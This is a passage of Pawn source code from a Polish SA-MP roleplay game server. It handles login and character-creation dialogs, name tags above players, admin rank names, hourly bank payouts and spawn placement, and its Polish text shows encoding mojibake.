			SendClientMessage(ownerid, COLOR_GRAY, "Jesteœ zameldowany w jakimœ innym budynku, nie bêdziesz spawnowaæ siê w tym.");
		}
	}
	DoorCache[LastdUID][dPlayerUID] = ownerid;
	DoorCache[LastdUID][dGroupUID] = 0;
	DoorCache[LastdUID][dOutX] = X;
	DoorCache[LastdUID][dOutY] = Y;
	DoorCache[LastdUID][dOutZ] = Z;
	DoorCache[LastdUID][dInsVW] = VW;
	DoorCache[LastdUID][dInsX] = X;
	DoorCache[LastdUID][dInsY] = Y;
	DoorCache[LastdUID][dInsZ] = Z;
	DoorCache[LastdUID][dOutVW] = outVW;
	DoorCache[LastdUID][dDestroyed] = 0;
	DoorCache[LastdUID][dOpen] = 1;
	DoorCache[LastdUID][dVehicle] = 0;
	if(DoorCache[LastdUID][dType])
	dPickupID[LastdUID] = CreateDynamicPickup(1239, 2, X,Y, Z, DoorCache[LastdUID][dOutVW], 0, -1);
	else
	dPickupID[LastdUID] = CreateDynamicPickup(1273, 2, X, Y, Z, DoorCache[LastdUID][dOutVW], 0, -1);
	new url[256];
	url = "";
	DoorCache[LastdUID][dUrl] = url;
	LastdUID++;*/
}

stock IsListItemGroup(itemuid, groupuid)
{
	if(ItemCache[itemuid][iGroup])
	return groupuid;
	return 0;
}

stock GetPickupModelFromGroupType(gtype)
{
	if(gtype == 0)
	return 1273;
	if(gtype == 1)
	return 1247;
	if(gtype == 2)
	return 1241;
	if(gtype == 3)
	return 1582;
	if(gtype == 4)
	return 1239;
	if(gtype == 5)
	return 1239;
	if(gtype == 6)
	return 1239;
	if(gtype == 7)
	return 1212;
	if(gtype == 8)
	return 1274;
	if(gtype == 9)
	return 1210;
	if(gtype == 10)
	return 1318;
	if(gtype == 11)
	return 1727;
	if(gtype == 12)
	return 1239;
	if(gtype == 13)
	return 1272;
	if(gtype == 14)
	return 11746;
	if(gtype == 15)
	return 3071;
	if(gtype == 16)
	return 1210;
	return 1239;
}

stock ReturnPlayerName(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	return name;
}

stock UserPath(id)
{
	new path[64];
	format(path, sizeof(path), FOLDER_USERS"%d.ini", id);
	return path;
}

stock Isnull(const string[])
return !strlen(string);

stock BackToMenu(playerid)
{
	new query[128];
	format(query, sizeof(query), "SELECT * FROM players WHERE name = '%s'", ReturnPlayerName(playerid));
	new Cache:cache = mysql_query(DB_HANDLE, query);

	new rows = 0;
	cache_get_row_count(rows);

	cache_delete(cache);
	if(rows)
	{
		ShowDialogLogin(playerid);
		
	}
	else
		ShowDialogNotFound(playerid);

}

stock SaveAccounts()
{
	/*new count;
	for(new i; i < LastUID; i++)
	{
		if(!dfile_FileExists(UserPath(i)))
		{
			dfile_Create(UserPath(i));
		}
		dfile_Open(UserPath(i));
		dfile_WriteString("Name", PlayerCache[i][pName]);
		dfile_WriteInt("UID", PlayerCache[i][pUID]);
		dfile_WriteInt("Skin", PlayerCache[i][pSkin]);
		dfile_WriteFloat("Health", PlayerCache[i][pHealth]);
		dfile_WriteInt("Cash", PlayerCache[i][pCash]);
		dfile_WriteInt("Tutorial", PlayerCache[i][pTutorialLevel]);
		dfile_WriteInt("Strenght", PlayerCache[i][pStrenght]);
		dfile_WriteInt("Rank", PlayerCache[i][pLevel]);
		dfile_WriteInt("BornDate", PlayerCache[i][pBornDate]);
		dfile_WriteInt("BW", PlayerCache[i][pBW_Time]);
		dfile_WriteFloat("SpawnX", PlayerCache[i][pPosX]);
		dfile_WriteFloat("SpawnY", PlayerCache[i][pPosY]);
		dfile_WriteFloat("SpawnZ", PlayerCache[i][pPosZ]);
		dfile_WriteInt("BWReason", PlayerCache[i][pBW_Reason]);
		dfile_WriteInt("AJ", PlayerCache[i][pAJ_Time]);
		dfile_WriteInt("Group", PlayerCache[i][pGroup]);
		dfile_WriteInt("Group2", PlayerCache[i][pGroup2]);
		dfile_WriteInt("Group3", PlayerCache[i][pGroup3]);
		dfile_WriteBool("GroupMapper", PlayerCache[i][pGroupMapper]);
		dfile_WriteBool("GroupMapper2", PlayerCache[i][pGroupMapper2]);
		dfile_WriteBool("GroupMapper3", PlayerCache[i][pGroupMapper3]);
		dfile_WriteBool("GroupAdmin", PlayerCache[i][pGroupAdmin]);
		dfile_WriteBool("GroupAdmin2", PlayerCache[i][pGroupAdmin2]);
		dfile_WriteBool("GroupAdmin3", PlayerCache[i][pGroupAdmin3]);
		dfile_WriteBool("GroupVehicle", PlayerCache[i][pGroupVehicle]);
		dfile_WriteBool("GroupVehicle2", PlayerCache[i][pGroupVehicle2]);
		dfile_WriteBool("GroupVehicle3", PlayerCache[i][pGroupVehicle3]);
		dfile_WriteBool("GroupProducts", PlayerCache[i][pGroupProducts]);
		dfile_WriteBool("GroupProducts2", PlayerCache[i][pGroupProducts2]);
		dfile_WriteBool("GroupProducts3", PlayerCache[i][pGroupProducts3]);
		dfile_WriteBool("GroupDoor", PlayerCache[i][pGroupDoor]);
		dfile_WriteBool("GroupDoor2", PlayerCache[i][pGroupDoor2]);
		dfile_WriteBool("GroupDoor3", PlayerCache[i][pGroupDoor3]);
		dfile_WriteBool("GroupInvite", PlayerCache[i][pGroupInvite]);
		dfile_WriteBool("GroupInvite2", PlayerCache[i][pGroupInvite2]);
		dfile_WriteBool("GroupInvite3", PlayerCache[i][pGroupInvite3]);
		dfile_WriteInt("GroupDuty", PlayerCache[i][pGroupDuty]);
		dfile_WriteInt("GroupDuty2", PlayerCache[i][pGroupDuty2]);
		dfile_WriteInt("GroupDuty3", PlayerCache[i][pGroupDuty3]);
		dfile_WriteBool("GroupPayDay", PlayerCache[i][pGroupPayDay]);
		dfile_WriteBool("GroupPayDay2", PlayerCache[i][pGroupPayDay2]);
		dfile_WriteBool("GroupPayDay3", PlayerCache[i][pGroupPayDay3]);
		dfile_WriteInt("GroupReward", PlayerCache[i][pGroupReward]);
		dfile_WriteInt("GroupReward2", PlayerCache[i][pGroupReward2]);
		dfile_WriteInt("GroupReward3", PlayerCache[i][pGroupReward3]);
		dfile_WriteInt("Min", PlayerCache[i][uMin]);
		dfile_WriteInt("H", PlayerCache[i][uH]);
		dfile_WriteInt("SP", PlayerCache[i][pScore]);
		dfile_WriteInt("HouseSpawn", PlayerCache[i][pHouseSpawn]);
		dfile_WriteInt("Bank", PlayerCache[i][pBank]);
		dfile_WriteBool("Mapper", PlayerCache[i][uMapper]);
		dfile_WriteInt("SpawnVW", PlayerCache[i][pPosVW])
		dfile_WriteInt("ID", PlayerCache[i][pID_Card]);
		dfile_WriteInt("BankAccount", PlayerCache[i][pBankAccount]);
		dfile_WriteInt("LastLogin", PlayerCache[i][uLastLogin]);
		dfile_WriteBool("Freeze", PlayerCache[i][uFreeze]);
		dfile_WriteBool("OOC", PlayerCache[i][pOOC]);
		dfile_WriteBool("AchievementManDown", PlayerCache[i][uAchievementManDown]);
		dfile_WriteBool("Block", PlayerCache[i][uBlock]);
		dfile_WriteString("BlockReason", PlayerCache[i][uBlockReason]);
		dfile_WriteString("FavAnim", PlayerCache[i][pFavAnim]);
		dfile_WriteInt("JailTime", PlayerCache[i][pJailTime]);
		dfile_WriteFloat("JailX", PlayerCache[i][pJailX]);
		dfile_WriteFloat("JailY", PlayerCache[i][pJailY]);
		dfile_WriteFloat("JailZ", PlayerCache[i][pJailZ]);
		dfile_WriteInt("JailVW", PlayerCache[i][pJailVW]);
		dfile_WriteString("OOCName", PlayerCache[i][pOOCName]);
		dfile_WriteInt("LastTraining", PlayerCache[i][pLastTraining]);
		dfile_WriteInt("Editor", PlayerCache[i][pObjectEditor]);
		dfile_SaveFile();
		dfile_CloseFile();
		count++;
	}
	printf(">>> Saved %d accounts.", count);*/
}

stock LoadUIDs()
{
	/*if(dfile_FileExists(UID_FILE))
	{
		dfile_Open(UID_FILE);
		LastUID = dfile_ReadInt("UID");
		LastdUID = dfile_ReadInt("dUID");
		MAX_ITEMS = dfile_ReadInt("iUID");
		LastMsgUID = dfile_ReadInt("MsgUID");
		LastContactUID = dfile_ReadInt("ContactUID");
		LastgUID = dfile_ReadInt("gUID");
		MAX_OBJECTS = dfile_ReadInt("oUID");
		LasttUID = dfile_ReadInt("tUID");
		LastvUID = dfile_ReadInt("vUID");
		LastaUID = dfile_ReadInt("aUID");
		dfile_CloseFile();
	}*/
}

stock SaveUIDs()
{
	/*if(dfile_FileExists(UID_FILE))
	{
		dfile_Open(UID_FILE);
		dfile_WriteInt("UID", LastUID);
		dfile_WriteInt("dUID", LastdUID);
		dfile_WriteInt("iUID", MAX_ITEMS);
		dfile_WriteInt("MsgUID", LastMsgUID);
		dfile_WriteInt("ContactUID", LastContactUID);
		dfile_WriteInt("gUID", LastgUID);
		dfile_WriteInt("oUID", MAX_OBJECTS);
		dfile_WriteInt("tUID", LasttUID);
		dfile_WriteInt("vUID", LastvUID);
		dfile_WriteInt("aUID", LastaUID);
		dfile_SaveFile();
		dfile_CloseFile();
	}*/
}

stock ShowDialogLogin(playerid)
{
	new str[256];
	format(str, sizeof(str), ""HEX_PURPLE"Witaj na serwerze Szkodnik RolePlay!"HEX_WHITE"\n\nPostaæ "HEX_RED"%s"HEX_WHITE" zosta³a odnaleziona.\n\nZaloguj siê podaj¹c poprawne has³o lub wybierz 'Zmieñ' jeœli chcesz zalogowaæ siê na inn¹ postaæ.", ReturnPlayerName(playerid));
	ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "Logowanie", str, "Zaloguj", "Zmieñ");
	return 1;
}

stock ShowDialogNotFound(playerid)
{
	new str[256];format(str, sizeof(str), ""HEX_WHITE"Postaæ "HEX_RED"%s"HEX_WHITE" nie zosta³a odnaleziona.\n\nMo¿esz wyszukaæ postaæ ju¿ istniej¹c¹ lub stworzyæ zupe³nie now¹.\n\n"HEX_PURPLE"1\tWybierz przycisk stwórz by stworzyæ now¹ postaæ.\n2\tWybierz przycisk zmieñ by znaleŸæ postaæ ju¿ istniej¹c¹.", ReturnPlayerName(playerid));
	return ShowPlayerDialog(playerid, D_NOTFOUND, DIALOG_STYLE_MSGBOX, "Stwórz lub zmieñ postaæ", str, "Stwórz", "Zmieñ");
}

stock ShowDialogFind(playerid)
return ShowPlayerDialog(playerid, D_FIND, DIALOG_STYLE_INPUT, "Wybór postaci", ""HEX_PURPLE"Witaj na serwerze Szkodnik RolePlay!\n\n"HEX_WHITE"WprowadŸ nazwê postaci w formacie: "HEX_RED"Imie_Nazwisko"HEX_WHITE" by wyszukaæ ju¿ istniej¹c¹ postaæ.\n\nWybierz drug¹ opcje by stworzyæ now¹ postaæ.", "Zmieñ", "Stwórz");

stock ShowDialogCreate(playerid)
return ShowPlayerDialog(playerid, D_CREATE, DIALOG_STYLE_INPUT, "Wpisz dane postaci", "Aby utworzyæ now¹ postaæ wpisz poni¿ej jej dane w formacie:\n\n"HEX_RED"[Imie_Nazwisko]\t[Data urodzenia]\t[P³eæ]\n\n"HEX_WHITE"Z czego p³eæ to: m - mê¿czyzna oraz k - kobieta\n\nPrzyk³ad: Josh_Smith 1990 m", "WprowadŸ", "Anuluj");

stock ShowDialogPassword(playerid)
{
	ShowPlayerDialog(playerid, D_PASS, DIALOG_STYLE_PASSWORD, "WprowadŸ has³o", ""HEX_WHITE"Wpisz poni¿ej has³o za pomoc¹ którego bêdziesz logowaæ siê do swojej postaci.\n\n"HEX_PURPLE"Prosimy nie wpisywaæ hase³ zawieraj¹cych polskie znaki, gdy¿ logowanie potem bêdzie nie mo¿liwe.", "Stwórz", "Anuluj");
	return 1;
}


stock PlayerIP(playerid)
{
	new IP[128];
	GetPlayerIp(playerid, IP, sizeof(IP));
	return IP;
}

stock SetSpawnInfoFix(playerid, team, skinid, Float:X, Float:Y, Float:Z)
{
	SetSpawnInfo(playerid, team, skinid, X, Y, Z, 0.0, 0, 0, 0, 0, 0, 0);
	return SetPlayerTeam(playerid, team); // Set Player Team bug fix
}

stock LoginPlayer(playerid)
{

	DestroyDynamic3DTextLabel(pText[playerid]); // description

	TextDrawShowForPlayer(playerid, RadioTextDraw);

	SetPlayerScore(playerid, PlayerCache[playerid][pScore]);
	SetPlayerHealth(playerid, PlayerCache[playerid][pHealth]);
	SetPlayerColor(playerid, LOGGED_COLOR);
	CreatePlayerTextDraws(playerid);
	CallData[playerid][cCaller] = -1;
	CallData[playerid][cCalling] = 0;

	
	
	new str[256]; 
	format(str, sizeof(str), "> Witaj, %s! "HEX_GRAY"(UID: %d, ID: %d)"HEX_WHITE". ¯yczymy mi³ej gry!", ReturnPlayerName(playerid), PlayerCache[playerid][pUID], playerid);
	ClearChat(playerid);
	SendClientMessage(playerid, COLOR_WHITE, str);

	KillTimer(ChooseSkinTimer[playerid]);
	
	DestroyDynamic3DTextLabel(pNick[playerid][nID]); // Remove nickname on his ID

	if(PlayerCache[playerid][pLevel] != 0)
	pNick[playerid][nColor] = COLOR_WHITE;
	else
	pNick[playerid][nColor] = PLAYER_NORMAL_COLOR;

	pNick[playerid][nID] = CreateDynamic3DTextLabel(" ", pNick[playerid][nColor], 0.0, 0.0, 0.15, 15.0, playerid, INVALID_VEHICLE_ID, 1, -1, -1, -1);

	SetTimerEx("GiveScorePerHour", 60000*60, false, "i", playerid);

	if(PlayerCache[playerid][pLevel])
	{
		aduty[playerid] = 1;
		format(str, sizeof(str), "~w~rozpoczeto sluzbe:~n~~g~~h~~h~%s", GetRankName(PlayerCache[playerid][pLevel]));
		GameTextForPlayer(playerid, str, 3000, 4);
	}

	UpdatePlayerName(playerid);

	TogglePlayerSpectating(playerid, 0);

	pLogged[playerid] = true;
	
	

	return 1;
}

forward GiveScorePerHour(playerid);
public GiveScorePerHour(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		PlayerCache[playerid][pScore] += 30;
		SetPlayerScore(playerid, PlayerCache[playerid][pScore]);

		new query[128];
		format(query, sizeof(query), "UPDATE players SET score = '%d' WHERE uid = '%d'", PlayerCache[playerid][pScore], PlayerCache[playerid][pUID]);
		mysql_query(DB_HANDLE, query);

		if(!PlayerCache[playerid][pBankAccount])
		TextDrawForPlayerEx(playerid, 1, "Nie mozesz otrzymac cogodzinnego zasilku~n~poniewaz nie posiadasz konta bankowego.~n~Udaj sie do banku!", 10000);
		else
		{
			new msg[128]; format(msg, sizeof(msg), "#Bank "HEX_WHITE"Na konto wyp³ynê³a kwota 40$ z cogodzinnego zasi³ku.");
			SendClientMessage(playerid, COLOR_GREEN, msg);
			PlayerCache[playerid][pBank] += 40;
			SetTimerEx("GiveScorePerHour", 60000*60, false, "i", playerid);

			format(query, sizeof(query), "UPDATE players SET bank = '%d' WHERE uid = '%d'", PlayerCache[playerid][pBank], PlayerCache[playerid][pUID]);
			mysql_query(DB_HANDLE, query);
		}
	}
}

stock ReturnHour()
{
	new h, m, s;
	gettime(h, m ,s);
	return h;
}

stock ReturnMinute()
{
	new h, m, s;
	gettime(h,m,s);
	return m;
}

stock ReturnJailText(playerid)
{
	new text[16];
	if(PlayerCache[playerid][pGender])
	text = "przetrzymywana";
	else
	text = "przetrzymywany";
	return text;
}

stock UpdatePlayerName(playerid)
{
	new name[525], uid = playerid;
	format(name, sizeof(name), "%s, %d", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid);
	if(PlayerCache[uid][pJailTime])
	{
		format(name, sizeof(name), "%s, %d\n(%s)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, ReturnJailText(playerid));
	}
	if(pBelts[playerid])
	format(name, sizeof(name), "%s, %d\n(%s)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, IsHelmet(playerid) ? ("kask") : ("pasy"));
	if(PlayerCache[uid][pBW_Time])
	{
		format(name, sizeof(name), "%s, %d\n(%s)", RPName(playerid), playerid, GetBWReason(playerid));
		if(pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, %s)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid,GetBWReason(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"));
		if(pAFK[uid] && pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid,GetBWReason(playerid),IsHelmet(playerid) ? ("kask") : ("pasy"), ReturnHour(), ReturnMinute());
		if(pAFK[uid] && !pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid,GetBWReason(playerid), ReturnHour(), ReturnMinute());
		if(pAFK[uid] && PlayerCache[uid][pJailTime])
		format(name, sizeof(name), "%s, %d\n(%s, %s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid,GetBWReason(playerid), ReturnJailText(playerid),ReturnHour(), ReturnMinute());
		if(PlayerCache[uid][pJailTime])
		format(name, sizeof(name), "%s, %d\n(%s, %s)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid,GetBWReason(playerid), ReturnJailText(playerid));
	}
	if(pDuty[playerid])
	{
		if(pBelts[playerid])
		{
			format(name, sizeof(name), "%s, %d\n(%s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid,IsHelmet(playerid) ? ("kask") : ("pasy"), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
			if(pAFK[uid])
			{
				format(name, sizeof(name), "%s, %d\n(%s, AFK od: %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, IsHelmet(playerid) ? ("kask") : ("pasy"), ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
			}
		}
		else if(pAFK[uid])
		{
			format(name, sizeof(name), "%s, %d\n(AFK od: %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		}
		else if(pAFK[uid] && PlayerCache[uid][pJailTime])
		{
			format(name, sizeof(name), "%s, %d\n(%s, AFK od: %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, ReturnJailText(playerid), ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		}
		else if(PlayerCache[uid][pJailTime])
		{
			format(name, sizeof(name), "%s, %d\n(%s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, ReturnJailText(playerid), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		}
		else
		format(name, sizeof(name), "%s, %d\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
	}
	if(PlayerCache[uid][pStrenght] >= 300)
	{
		format(name, sizeof(name), "%s, %d\n(%s)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid));
		if(pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, %s)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"));
		if(pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid), ReturnHour(), ReturnMinute());
		if(pBelts[playerid] && pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"), ReturnHour(), ReturnMinute());
		if(PlayerCache[uid][pJailTime] && pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, ReturnJailText(playerid), GetPlayerStrenghtName(playerid), ReturnHour(), ReturnMinute());
		if(PlayerCache[uid][pJailTime])
		format(name, sizeof(name), "%s, %d\n(%s, %s)", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, ReturnJailText(playerid), GetPlayerStrenghtName(playerid));
	}
	if(PlayerCache[uid][pStrenght] >= 300 && pDuty[playerid])
	{
		format(name, sizeof(name), "%s, %d\n(%s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid), GroupCache[pDuty[playerid]][gColor], GroupCache[pDuty[playerid]][gName]);
		if(pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, AFK od: %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid), ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor], GroupCache[pDuty[playerid]][gName]);
		if(pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, %s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"),GroupCache[pDuty[playerid]][gColor], GroupCache[pDuty[playerid]][gName]);
		if(pBelts[playerid] && pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, AFK od: %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetPlayerStrenghtName(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"), ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor], GroupCache[pDuty[playerid]][gName]);
		if(PlayerCache[uid][pJailTime])
		format(name, sizeof(name), "%s, %d\n(%s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, ReturnJailText(playerid), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);

	}
	if(PlayerCache[uid][pStrenght] >= 300 && PlayerCache[uid][pBW_Time])
	{
		format(name, sizeof(name), "%s, %d\n(%s, %s)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid), GetPlayerStrenghtName(playerid));
		if(pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, %s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid), GetPlayerStrenghtName(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"), ReturnHour(), ReturnMinute());
		if(pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, %s)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid), GetPlayerStrenghtName(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"));
		if(pBelts[playerid] && pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, %s, AFK od: %02d:%02d)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid), GetPlayerStrenghtName(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"), ReturnHour(), ReturnMinute());
		if(PlayerCache[uid][pJailTime])
		format(name, sizeof(name), "%s, %d\n(%s, %s, %s)", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, ReturnJailText(playerid), GetBWReason(playerid), GetPlayerStrenghtName(playerid));
	}
	if(pDuty[playerid] && PlayerCache[uid][pBW_Time])
	{
		format(name, sizeof(name), "%s, %d\n(%s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid),GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		if(pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, AFK od %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid),ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		if(pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, %s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid), IsHelmet(playerid) ? ("kask") : ("pasy"),GroupCache[pDuty[playerid]][gColor] ,GroupCache[pDuty[playerid]][gName]);
		if(pBelts[playerid] && pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, AFK od %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '),playerid, GetBWReason(playerid),IsHelmet(playerid) ? ("kask") : ("pasy"),ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
	}
	if(pDuty[playerid] && PlayerCache[uid][pBW_Time] && PlayerCache[uid][pStrenght] >= 300)
	{
		format(name, sizeof(name), "%s, %d\n(%s, %s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, GetBWReason(playerid),GetPlayerStrenghtName(playerid),GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		if(pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, AFK od %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, GetBWReason(playerid),GetPlayerStrenghtName(playerid),ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		if(pBelts[playerid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, %s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, GetBWReason(playerid),GetPlayerStrenghtName(playerid),IsHelmet(playerid) ? ("kask") : ("pasy"),GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		if(pBelts[playerid] && pAFK[uid])
		format(name, sizeof(name), "%s, %d\n(%s, %s, %s, AFK od %02d:%02d)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, GetBWReason(playerid),GetPlayerStrenghtName(playerid),IsHelmet(playerid) ? ("kask") : ("pasy"),ReturnHour(), ReturnMinute(), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
		if(PlayerCache[uid][pJailTime])
		format(name, sizeof(name), "%s, %d\n(%s, %s, %s)\n{%s}[%s]", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, GetBWReason(playerid),GetPlayerStrenghtName(playerid),ReturnJailText(playerid), GroupCache[pDuty[playerid]][gColor],GroupCache[pDuty[playerid]][gName]);
	}
	pNick[playerid][nColor] = PLAYER_NORMAL_COLOR;

	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
		{
			if(ItemCache[i][iType] == 7)
			{
				if(ItemCache[i][iActive])
				{
					new pos = strfind(name, ",", true);
					strdel(name, pos, pos+3);
				}
			}
		}
	}
	if(aduty[playerid] != 0)
	{
		pNick[playerid][nColor] = COLOR_WHITE;
		format(name, sizeof(name), "%s %s(%s, %d)", strreplace(ReturnPlayerName(playerid), '_', ' '), GetHexRankColor(PlayerCache[playerid][pLevel]), GetRankName(PlayerCache[playerid][pLevel]), playerid);
	}
	pNick[playerid][nStr] = name;

	UpdateDynamic3DTextLabelText(pNick[playerid][nID], pNick[playerid][nColor], name);
	return 1;
}

stock GetHexRankColor(rank)
{
	new hex[16];
	switch(rank)
	{
		case 1: hex = "{AC5DFF}";
		case 2: hex = "{AC5DFF}";
		case 3: hex = "{AC5DFF}";
		case 4: hex = "{5B98FF}";
		case 5: hex = "{5B98FF}";
		case 6: hex = "{CC0000}";
		case 7: hex = "{D23D42}";
		case 8: hex = "{00E300}";
	}
	return hex;
}

stock GetRankName(rank)
{
	new name[16];
	switch(rank)
	{
		case 1: name = "Supporter";
		case 2: name = "Supporter 2";
		case 3: name = "Supporter 3";
		case 4: name = "GameMaster";
		case 5: name = "SGM";
		case 6: name = "Admin";
		case 7: name = "SAdmin";
		case 8: name = "Programista";
	}
	return name;
}

stock GetPlayerStrenghtName(playerid)
{
	new name[16], uid = playerid, strenght = PlayerCache[playerid][pStrenght];
	if(PlayerCache[uid][pGender])
	{
		if(strenght >= 300)
		name = "wysportowana";
		if(strenght >= 600)
		name = "umiêœniona";
		if(strenght >= 900)
		name = "muskularna";
	}
	else
	{
		if(strenght >= 300)
		name = "wysportowany";
		if(strenght >= 600)
		name = "umiêœniony";
		if(strenght >= 900)
		name = "muskularny";
	}
	return name;
}

public OnPlayerRequestClass(playerid, classid)
{
	new str[256];
	if(PlayerCache[playerid][pTutorialLevel] == 2)
	{
		SetPlayerVirtualWorld(playerid, playerid-1);
		SetSpawnInfoFix(playerid, 0, PlayerCache[playerid][pSkin], 1021.3134,-1311.0098,13.5469);
	}
	if(PlayerCache[playerid][pAJ_Time] > 0)
	{
		SetPlayerVirtualWorld(playerid, playerid-1);
		format(str, sizeof(str), "~r~AdminJail: %dmin", PlayerCache[playerid][pAJ_Time]);
		PlayerTextDrawSetString(playerid, AJTextDraw[playerid], str);
		PlayerTextDrawShow(playerid, AJTextDraw[playerid]);
		SetSpawnInfoFix(playerid, 0, PlayerCache[playerid][pSkin], 1175.3094,-1179.7953,87.0432);
	}
	else if(PlayerCache[playerid][pJailTime])
	{
		format(str, sizeof(str), "~g~~h~~h~Przetrzymanie: %dmin", PlayerCache[playerid][pJailTime]);
		PlayerTextDrawSetString(playerid, AJTextDraw[playerid], str);
		PlayerTextDrawShow(playerid, AJTextDraw[playerid]);
		SetPlayerVirtualWorld(playerid, PlayerCache[playerid][pJailVW]);
